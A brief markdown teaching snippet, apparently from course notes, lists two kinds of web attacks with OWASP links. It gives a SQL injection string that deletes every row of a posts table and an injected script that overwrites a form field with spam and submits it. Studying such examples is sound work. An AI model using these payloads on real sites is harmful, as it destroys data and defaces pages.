### Kinds of attacks
- https://www.owasp.org/index.php/SQL_Injection
  ```
    '); delete from posts; --
  ```
- https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
  ```
  <script>
  setTimeout(function() {
      var tt = document.getElementById('content');
      tt.value = "<h2 style='color: #FF6699; font-family: Comic Sans MS'>Spam, spam, spam, spam,<br>Wonderful spam, glorious  spam!</h2>";
      tt.form.submit();
  }, 2500);
  </script>
```
